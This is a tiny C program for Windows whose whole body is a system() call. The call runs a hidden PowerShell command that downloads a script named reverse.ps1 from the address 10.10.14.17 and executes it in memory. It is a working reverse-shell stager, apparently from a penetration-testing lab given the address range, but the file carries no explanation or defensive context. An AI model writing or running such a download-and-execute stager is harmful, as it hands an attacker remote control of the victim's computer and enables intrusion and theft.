#include <windows.h>

int main() {
    system("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:80/reverse.ps1')\"");
    return 0;
}
